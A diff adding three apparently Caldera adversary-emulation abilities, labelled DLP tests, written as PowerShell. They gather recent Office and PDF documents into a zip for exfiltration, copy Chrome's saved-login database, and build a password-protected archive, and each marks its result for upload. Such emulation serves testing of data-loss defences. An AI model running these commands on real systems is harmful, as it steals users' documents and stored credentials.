@@ -1,0 +1,83 @@
+- id: 94f4c6f5-6b3d-4b4e-8a7c-123456789001
+  name: DLP - Collect Recent Documents
+  description: Collects recent Office documents and archives them for exfiltration (DLP Test)
+  tactic: collection
+  technique:
+    attack_id: T1005
+    name: Data from Local System
+  platforms:
+    windows:
+      psh:
+        command: |
+          $stageDir = "$env:TEMP\dlp_stage_#{paw}";
+          New-Item -ItemType Directory -Force -Path $stageDir | Out-Null;
+          $cutoffDate = (Get-Date).AddDays(-7);
+          $files = Get-ChildItem -Path "$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop" -Include *.doc, *.docx, *.xls, *.xlsx, *.pdf -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -gt $cutoffDate};
+          foreach ($file in $files) {
+              $dest = Join-Path $stageDir $file.Name;
+              Copy-Item -Path $file.FullName -Destination $dest -Force;
+          }
+          if (Test-Path "$stageDir\*") {
+              Compress-Archive -Path "$stageDir\*" -DestinationPath "$env:TEMP\dlp_data_#{paw}.zip" -Force;
+              Write-Output "[DLP] Collected $($files.Count) files to $env:TEMP\dlp_data_#{paw}.zip";
+          } else {
+              Write-Output "[DLP] No recent documents found";
+          }
+        payloads: []
+        cleanup: |
+          Remove-Item -Recurse -Force "$env:TEMP\dlp_stage_#{paw}" -ErrorAction SilentlyContinue;
+          Remove-Item -Force "$env:TEMP\dlp_data_#{paw}.zip" -ErrorAction SilentlyContinue
+        uploads:
+          - $env:TEMP\dlp_data_#{paw}.zip
+
+- id: 94f4c6f5-6b3d-4b4e-8a7c-123456789002
+  name: DLP - Extract Browser Credentials
+  description: Attempts to extract saved browser credentials (DLP Test)
+  tactic: credential-access
+  technique:
+    attack_id: T1555
+    name: Credentials from Password Stores
+  platforms:
+    windows:
+      psh:
+        command: |
+          $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data";
+          if (Test-Path $chromePath) {
+              $tempCopy = "$env:TEMP\chrome_login_data_#{paw}";
+              Copy-Item -Path $chromePath -Destination $tempCopy -Force;
+              Write-Output "[DLP] Chrome credentials database copied to $tempCopy";
+              $tempCopy;
+          } else {
+              Write-Output "[DLP] Chrome credentials database not found";
+          }
+        payloads: []
+        cleanup: |
+          Remove-Item -Force "$env:TEMP\chrome_login_data_#{paw}" -ErrorAction SilentlyContinue
+        uploads:
+          - $env:TEMP\chrome_login_data_#{paw}
+
+- id: 94f4c6f5-6b3d-4b4e-8a7c-123456789003
+  name: DLP - Archive Sensitive Data
+  description: Creates encrypted archive of sensitive data (DLP Test)
+  tactic: collection
+  technique:
+    attack_id: T1560
+    name: Archive Collected Data
+  platforms:
+    windows:
+      psh:
+        command: |
+          $dataFile = "$env:TEMP\sensitive_data_#{paw}.txt";
+          "Confidential Data: Project Alpha Budget 2024`nEmployee List: John Doe, Jane Smith`nAPI Keys: xyz123-abc456" | Out-File $dataFile;
+          $archive = "$env:TEMP\dlp_encrypted_#{paw}.7z";
+          if (Get-Command 7z -ErrorAction SilentlyContinue) {
+              7z a -p"DLPTestPassword123!" -mhe $archive $dataFile;
+          } else {
+              Compress-Archive -Path $dataFile -DestinationPath $archive -Force;
+          }
+          Write-Output "[DLP] Created encrypted archive: $archive";
+        payloads: []
+        cleanup: |
+          Remove-Item -Force "$env:TEMP\sensitive_data_#{paw}.txt","$env:TEMP\dlp_encrypted_#{paw}.7z" -ErrorAction SilentlyContinue
+        uploads:
+          - $env:TEMP\dlp_encrypted_#{paw}.7z
